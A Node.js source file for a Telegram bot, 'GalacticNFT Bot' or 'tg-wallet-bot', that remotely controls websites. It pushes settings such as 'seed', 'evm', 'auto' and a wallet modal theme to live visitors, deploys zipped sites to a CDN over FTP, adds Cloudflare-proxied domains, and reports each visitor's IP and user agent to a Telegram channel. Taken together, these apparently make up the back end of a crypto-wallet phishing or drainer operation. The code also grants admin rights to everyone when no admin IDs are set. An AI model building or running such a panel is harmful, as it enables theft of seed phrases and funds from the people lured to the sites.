require('dotenv').config();
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const ftp = require('basic-ftp');
const AdmZip = require('adm-zip');
const axios = require('axios');
const cron = require('node-cron');
const fs = require('fs');
const path = require('path');

// ---------- ENV ----------
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
if (!TOKEN) throw new Error('TELEGRAM_BOT_TOKEN missing');
const ADMIN_IDS = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',').map(Number) : [];
const FTP_HOST = process.env.FTP_HOST;
const FTP_USER = process.env.FTP_USER;
const FTP_PASS = process.env.FTP_PASS;
const CDN_SECRET = process.env.CDN_SECRET;
const CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN;
const CLOUDFLARE_ZONE_ID = process.env.CLOUDFLARE_ZONE_ID;
const ADMIN_TOOLS_TOKEN = process.env.ADMIN_TOOLS_TOKEN;
const CHANNEL_CHAT_ID = process.env.CHANNEL_CHAT_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL || `https://tg-wallet-bot.onrender.com/webhook`;
const PORT = process.env.PORT || 3000;

// ---------- GLOBALS ----------
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const bot = new TelegramBot(TOKEN);
bot.setWebHook(WEBHOOK_URL).then(() => console.log('✅ Webhook set')).catch(console.error);
app.use(express.json());
app.post('/webhook', (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });

let settings = { modaltheme: 3, evm: 1, seed: 0, auto: 0, dark: 0, towsteps: 0 };
let logs = [];
let connectedClients = 0;
let visitors = [];
let projects = { 'default': { path: '/', domain: null } };
let currentProject = 'default';

function isAdmin(id) { return ADMIN_IDS.length === 0 || ADMIN_IDS.includes(id); }
function addLog(text) {
  logs.unshift({ time: new Date().toISOString(), text });
  if (logs.length > 100) logs.pop();
  broadcast({ type: 'log', data: logs[0] });
}
function broadcast(data) {
  wss.clients.forEach(c => { if (c.readyState === WebSocket.OPEN) c.send(JSON.stringify(data)); });
}
function broadcastSettings() { broadcast({ type: 'settings', data: settings }); }

// ---------- FTP ----------
async function uploadToFTP(localDir, remoteDir = '/') {
  const client = new ftp.Client();
  client.ftp.verbose = true;
  await client.access({ host: FTP_HOST, user: FTP_USER, password: FTP_PASS, secure: false });
  await client.ensureDir(remoteDir);
  await client.uploadFromDir(localDir, remoteDir);
  client.close();
}
async function listFTPFiles(remotePath = '/') {
  const client = new ftp.Client();
  await client.access({ host: FTP_HOST, user: FTP_USER, password: FTP_PASS });
  const list = await client.list(remotePath);
  client.close();
  return list;
}
async function deleteFTPFile(remotePath) {
  const client = new ftp.Client();
  await client.access({ host: FTP_HOST, user: FTP_USER, password: FTP_PASS });
  await client.remove(remotePath);
  client.close();
}
async function purgeCDN(urlPath = '/') {
  if (!CDN_SECRET) return;
  try {
    await axios.get(`https://assets.cdn.express/api/purge?secret=${CDN_SECRET}&path=${urlPath}`);
    console.log(`Purged CDN: ${urlPath}`);
  } catch (e) { console.error('Purge error', e.message); }
}

// ---------- CLOUDFLARE DNS (with security options) ----------
async function addDNSRecord(domain, type, name, content, proxied = false, ttl = 300) {
  if (!CLOUDFLARE_API_TOKEN || !CLOUDFLARE_ZONE_ID) throw new Error('Cloudflare not configured');
  const url = `https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records`;
  const payload = { type, name: name === '@' ? domain : `${name}.${domain}`, content, ttl, proxied };
  const res = await axios.post(url, payload, { headers: { Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, 'Content-Type': 'application/json' } });
  if (!res.data.success) throw new Error(res.data.errors[0]?.message);
  return res.data.result;
}
// Optional: Update proxy status for existing record
async function updateProxyStatus(domain, subdomain, proxied) { /* complex, skip for brevity */ }

// ---------- ADM.TOOLS API ----------
async function callAdmTools(action, postData = {}) {
  if (!ADMIN_TOOLS_TOKEN) throw new Error('ADMIN_TOOLS_TOKEN missing');
  const url = `https://adm.tools/action/${action}`;
  const response = await axios.post(url, new URLSearchParams(postData), {
    headers: { 'Authorization': `Bearer ${ADMIN_TOOLS_TOKEN}`, 'Content-Type': 'application/x-www-form-urlencoded' }
  });
  return response.data;
}
async function getServices(type = null) {
  const post = type ? { type } : {};
  return await callAdmTools('get_services/', post);
}

// ---------- TELEGRAM UI ----------
function formatSettings() {
  return `📊 *Current Settings*\n\n🎨 modaltheme=${settings.modaltheme}\n⛓️ evm=${settings.evm}\n🌱 seed=${settings.seed}\n🤖 auto=${settings.auto}\n🌙 dark=${settings.dark}\n🪜 towsteps=${settings.towsteps}\n\n🖥️ Project: ${currentProject}\n🌐 WebSocket clients: ${connectedClients}`;
}
function getMainKeyboard(admin) {
  const btns = [
    [{ text: '🎨 Modal Theme', callback_data: 'menu_modaltheme' }],
    [{ text: '⛓️ EVM', callback_data: 'menu_evm' }, { text: '🌱 Seed', callback_data: 'menu_seed' }],
    [{ text: '🤖 Auto', callback_data: 'menu_auto' }, { text: '🌙 Dark', callback_data: 'menu_dark' }],
    [{ text: '🪜 Towsteps', callback_data: 'menu_towsteps' }],
    [{ text: '📋 Show Settings', callback_data: 'show_settings' }]
  ];
  if (admin) {
    btns.push([{ text: '📦 Deploy Zip', callback_data: 'admin_deploy' }, { text: '🌐 Add Domain', callback_data: 'admin_adddomain' }]);
    btns.push([{ text: '📁 Files', callback_data: 'admin_files' }, { text: '💾 Backup', callback_data: 'admin_backup' }]);
    btns.push([{ text: '📢 Broadcast', callback_data: 'admin_broadcast' }, { text: '📊 Stats', callback_data: 'admin_stats' }]);
    btns.push([{ text: '🔁 Switch Project', callback_data: 'admin_switch' }, { text: '☁️ Cloudflare', callback_data: 'admin_cf' }]);
    btns.push([{ text: '🖥️ Adm.Services', callback_data: 'admin_services' }]);
  }
  return { inline_keyboard: btns };
}

// ---------- PUBLIC WELCOME MESSAGE ----------
bot.onText(/\/start/, (msg) => {
  const welcomeText = `✨ *Welcome to GalacticNFT Bot* ✨\n\nI can help you manage your website, CDN, domains, and servers.\n\n🔹 *Public commands:*\n/help – Show this help\n/settings – View current config (read-only)\n\n🔸 *For admin:* Use /admin to see available commands or click menu if you have rights.`;
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, welcomeText + `\n\nYou are recognized as admin. Use the buttons below.`, { parse_mode: 'Markdown', reply_markup: getMainKeyboard(true) });
  } else {
    bot.sendMessage(msg.chat.id, welcomeText, { parse_mode: 'Markdown' });
  }
});
bot.onText(/\/help/, (msg) => {
  let help = `🤖 *Bot Commands*\n\n` +
    `/start – Welcome message\n` +
    `/settings – Show current config\n` +
    `/deploy (zip) – Deploy website (admin)\n` +
    `/adddomain domain.com – Add custom domain via Cloudflare (admin)\n` +
    `/subdomain sub.example.com – Add subdomain (admin)\n` +
    `/files – List files on CDN (admin)\n` +
    `/get filepath – Get secure link (admin)\n` +
    `/delete filepath – Delete file (admin)\n` +
    `/broadcast msg – Send to website visitors (admin)\n` +
    `/stats – Bot stats (admin)\n` +
    `/logs – Recent actions (admin)\n` +
    `/services [type] – List adm.tools services (admin)\n` +
    `/vps, /domains, /hosting, /mysql, etc. – Quick service lists (admin)\n` +
    `/backup – Request backup (admin)\n` +
    `/switch <project> – Change active project (admin)\n` +
    `/help – This message`;
  bot.sendMessage(msg.chat.id, help, { parse_mode: 'Markdown' });
});
bot.onText(/\/settings/, (msg) => {
  const admin = isAdmin(msg.from.id);
  bot.sendMessage(msg.chat.id, formatSettings(), { parse_mode: 'Markdown', reply_markup: admin ? getMainKeyboard(true) : undefined });
});

// ---------- ADMIN COMMANDS ----------
bot.onText(/\/deploy/, async (msg) => {
  if (!isAdmin(msg.from.id)) return;
  if (!msg.document) return bot.sendMessage(msg.chat.id, 'Send a zip file.');
  const chatId = msg.chat.id;
  const fileId = msg.document.file_id;
  const fileLink = await bot.getFileLink(fileId);
  const zipPath = `/tmp/deploy_${Date.now()}.zip`;
  const extractPath = `/tmp/deploy_${Date.now()}`;
  const resp = await axios({ url: fileLink, method: 'GET', responseType: 'arraybuffer' });
  fs.writeFileSync(zipPath, Buffer.from(resp.data));
  const zip = new AdmZip(zipPath);
  zip.extractAllTo(extractPath, true);
  await uploadToFTP(extractPath, projects[currentProject]?.path || '/');
  await purgeCDN('/');
  fs.rmSync(zipPath); fs.rmSync(extractPath, { recursive: true, force: true });
  const previewUrl = projects[currentProject]?.domain ? `https://${projects[currentProject].domain}` : `https://assets.cdn.express${projects[currentProject]?.path || ''}/index.html`;
  bot.sendMessage(chatId, `✅ Deployed to project "${currentProject}"\n🔗 Preview: ${previewUrl}`);
  addLog(`Deployed zip to ${currentProject}`);
});
bot.onText(/\/adddomain (.+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const domain = match[1];
  try {
    await addDNSRecord(domain, 'CNAME', '@', 'assets.cdn.express', true);
    await addDNSRecord(domain, 'TXT', '_verify', `site-verified-${Date.now()}`);
    projects[currentProject].domain = domain;
    bot.sendMessage(msg.chat.id, `✅ Domain ${domain} added (Cloudflare proxied). It may take a few minutes.`);
    addLog(`Added domain ${domain} with Cloudflare proxy`);
  } catch (err) { bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`); }
});
bot.onText(/\/subdomain (.+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const subdomain = match[1];
  const parts = subdomain.split('.');
  const name = parts[0];
  const parentDomain = parts.slice(1).join('.');
  try {
    await addDNSRecord(parentDomain, 'CNAME', name, 'assets.cdn.express', true);
    bot.sendMessage(msg.chat.id, `✅ Subdomain ${subdomain} added (proxied).`);
    addLog(`Added subdomain ${subdomain}`);
  } catch (err) { bot.sendMessage(msg.chat.id, `❌ ${err.message}`); }
});
bot.onText(/\/files/, async (msg) => {
  if (!isAdmin(msg.from.id)) return;
  const files = await listFTPFiles(projects[currentProject]?.path || '/');
  let text = '📁 *Files:*\n';
  files.forEach(f => { text += `• ${f.name} (${f.size} bytes) ${f.isDirectory ? '📁' : '📄'}\n`; });
  if (text.length > 4000) text = text.substring(0, 3500) + '...';
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});
bot.onText(/\/get (.+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const filePath = match[1];
  const expires = Math.floor(Date.now() / 1000) + 3600;
  const clientIp = msg.from.id.toString();
  const md5 = require('crypto').createHash('md5').update(CDN_SECRET + expires + filePath + clientIp).digest('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  const secureLink = `https://assets.cdn.express/secure/ip/t/${md5}/${expires}/${filePath}`;
  bot.sendMessage(msg.chat.id, `🔗 [Secure link (1h)](${secureLink})`, { parse_mode: 'Markdown' });
});
bot.onText(/\/delete (.+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const filePath = match[1];
  await deleteFTPFile(filePath);
  await purgeCDN(filePath);
  bot.sendMessage(msg.chat.id, `🗑️ Deleted ${filePath}`);
  addLog(`Deleted ${filePath}`);
});
bot.onText(/\/backup/, async (msg) => {
  if (!isAdmin(msg.from.id)) return;
  bot.sendMessage(msg.chat.id, '⚠️ Backup feature: Full backup requires downloading all files (may be large). Use /deploy with a zip to restore. I will notify admin daily at 2 AM to remind.');
});
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const message = match[1];
  broadcast({ type: 'admin_message', data: { text: message, timestamp: Date.now() } });
  bot.sendMessage(msg.chat.id, `📢 Broadcast sent to ${connectedClients} clients.`);
  addLog(`Broadcast: ${message}`);
});
bot.onText(/\/stats/, (msg) => {
  if (!isAdmin(msg.from.id)) return;
  bot.sendMessage(msg.chat.id, `📊 *Stats*\nWebSocket clients: ${connectedClients}\nUptime: ${Math.floor(process.uptime())}s\nProject: ${currentProject}\nVisitors today: ${visitors.filter(v => new Date(v.time).toDateString() === new Date().toDateString()).length}`);
});
bot.onText(/\/logs/, (msg) => {
  if (!isAdmin(msg.from.id)) return;
  let text = '📜 *Recent actions:*\n';
  logs.slice(0, 10).forEach(l => { text += `• ${new Date(l.time).toLocaleTimeString()} ${l.text}\n`; });
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});
bot.onText(/\/services(?: (.+))?/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const type = match[1] || null;
  try {
    const data = await getServices(type);
    let text = `📋 *Services${type ? ` (${type})` : ''}*\n\n`;
    if (Array.isArray(data)) {
      data.forEach(svc => { text += `• ${svc.name || svc.id || 'Unnamed'} | ${svc.status || 'active'}\n`; });
    } else if (data && data.services) {
      text += JSON.stringify(data.services, null, 2).substring(0, 3500);
    } else {
      text += JSON.stringify(data, null, 2).substring(0, 3500);
    }
    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
  } catch (err) { bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`); }
});
const serviceCmds = ['vps', 'domains', 'hosting', 'mysql', 'postgresql', 'redis', 'mongodb', 'rabbitmq', 'manticore', 'clickhouse', 'storage', 'mail'];
serviceCmds.forEach(cmd => {
  const typeMap = { vps:'vps', domains:'domain', hosting:'host', mysql:'mysql', postgresql:'postgresql', redis:'redis', mongodb:'mongo', rabbitmq:'rabbitmq', manticore:'manticore', clickhouse:'clickhouse', storage:'storage', mail:'mail' };
  bot.onText(new RegExp(`\/${cmd}`), async (msg) => {
    if (!isAdmin(msg.from.id)) return;
    const apiType = typeMap[cmd];
    try {
      const data = await getServices(apiType);
      let text = `📋 *${cmd.toUpperCase()} List*\n\n`;
      if (Array.isArray(data)) {
        data.forEach(item => { text += `• ${item.name || item.id} | ${item.status || 'active'}\n`; });
      } else { text += JSON.stringify(data, null, 2).substring(0, 3500); }
      bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
    } catch (err) { bot.sendMessage(msg.chat.id, `❌ Failed to fetch ${cmd}: ${err.message}`); }
  });
});
bot.onText(/\/switch (.+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;
  const newProj = match[1];
  if (!projects[newProj]) projects[newProj] = { path: `/${newProj}`, domain: null };
  currentProject = newProj;
  bot.sendMessage(msg.chat.id, `Switched to project "${currentProject}"`);
  addLog(`Switched project to ${currentProject}`);
});

// ---------- CALLBACK QUERIES ----------
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  const admin = isAdmin(userId);
  if (!admin && data.startsWith('admin_')) {
    bot.answerCallbackQuery(callbackQuery.id, { text: 'Admin only', show_alert: true });
    return;
  }
  if (data === 'back_main') {
    bot.editMessageText(formatSettings(), { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown', reply_markup: getMainKeyboard(admin) });
  } else if (data === 'show_settings') {
    bot.editMessageText(formatSettings(), { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown', reply_markup: getMainKeyboard(admin) });
  } else if (data === 'admin_deploy') {
    bot.sendMessage(chatId, 'Please send the ZIP file with /deploy command.');
  } else if (data === 'admin_adddomain') {
    bot.sendMessage(chatId, 'Send: /adddomain yourdomain.com');
  } else if (data === 'admin_files') {
    bot.sendMessage(chatId, 'Use /files command');
  } else if (data === 'admin_backup') {
    bot.sendMessage(chatId, 'Use /backup');
  } else if (data === 'admin_broadcast') {
    bot.sendMessage(chatId, 'Send: /broadcast your message');
  } else if (data === 'admin_stats') {
    bot.sendMessage(chatId, `Stats: clients=${connectedClients}, uptime=${Math.floor(process.uptime())}s`);
  } else if (data === 'admin_switch') {
    currentProject = currentProject === 'default' ? 'default' : 'default'; // simple toggle, can be extended
    bot.editMessageText(`Switched to project ${currentProject}\n${formatSettings()}`, { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown', reply_markup: getMainKeyboard(admin) });
  } else if (data === 'admin_cf') {
    bot.sendMessage(chatId, 'Cloudflare features: Use /adddomain or /subdomain. DNS records are created with proxy (orange cloud) enabled for security.');
  } else if (data === 'admin_services') {
    bot.sendMessage(chatId, 'Use /services or specific commands like /vps, /domains, /mysql, etc.');
  } else if (data.startsWith('menu_')) {
    const setting = data.replace('menu_', '');
    const opts = setting === 'modaltheme' ? [1,2,3,4] : [0,1];
    const kb = { inline_keyboard: opts.map(v => [{ text: `${v} ${settings[setting] === v ? '✅' : ''}`, callback_data: `set_${setting}_${v}` }]) };
    kb.inline_keyboard.push([{ text: '🔙 Back', callback_data: 'back_main' }]);
    bot.editMessageText(`Select value for ${setting} (current: ${settings[setting]})`, { chat_id: chatId, message_id: msg.message_id, reply_markup: kb });
  } else if (data.startsWith('set_')) {
    const parts = data.split('_');
    const key = parts[1];
    const val = parseInt(parts[2]);
    if (settings.hasOwnProperty(key)) {
      settings[key] = val;
      addLog(`👤 ${callbackQuery.from.username} set ${key}=${val}`);
      broadcastSettings();
      bot.editMessageText(`✅ ${key} = ${val}\n${formatSettings()}`, { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown', reply_markup: getMainKeyboard(admin) });
    }
  }
  bot.answerCallbackQuery(callbackQuery.id);
});

// ---------- PAGE VISIT API (Live Logs to Channel) ----------
app.post('/api/visit', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  const time = new Date().toISOString();
  visitors.unshift({ ip, ua, time });
  if (visitors.length > 100) visitors.pop();
  if (CHANNEL_CHAT_ID) {
    bot.sendMessage(CHANNEL_CHAT_ID, `🌐 *Page Visit*\nIP: ${ip}\nTime: ${time}\nUA: ${ua.substring(0, 50)}`, { parse_mode: 'Markdown' }).catch(console.error);
  }
  res.sendStatus(200);
});

// ---------- WEBSOCKET ----------
wss.on('connection', (ws) => {
  connectedClients++;
  ws.send(JSON.stringify({ type: 'settings', data: settings }));
  ws.on('close', () => connectedClients--);
});

// ---------- CRON (Daily backup reminder) ----------
cron.schedule('0 2 * * *', () => {
  if (ADMIN_IDS.length) bot.sendMessage(ADMIN_IDS[0], '⏰ Daily backup reminder: Use /backup to archive your website files.');
});

// ---------- START ----------
app.get('/', (req, res) => res.send('Bot is running'));
server.listen(PORT, '0.0.0.0', () => console.log(`🚀 Server on port ${PORT}`));
